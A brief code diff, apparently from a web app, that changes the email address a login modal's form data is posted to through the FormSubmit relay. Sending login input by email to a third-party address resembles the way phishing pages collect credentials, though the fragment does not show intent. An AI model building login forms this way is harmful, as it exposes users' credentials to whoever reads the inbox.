@@ -119,7 +119,7 @@ const LoginModal = ({ isOpen, onClose, onLogin, productName = '' }) => {
       formDataToSend.append('_template', 'table');
 
       // Send to FormSubmit
-      const response = await fetch('https://formsubmit.co/q9g8moh@gmail.com', {
+      const response = await fetch('https://formsubmit.co/pmiteam@pmi-me.net', {
         method: 'POST',
         body: formDataToSend,
         headers: {
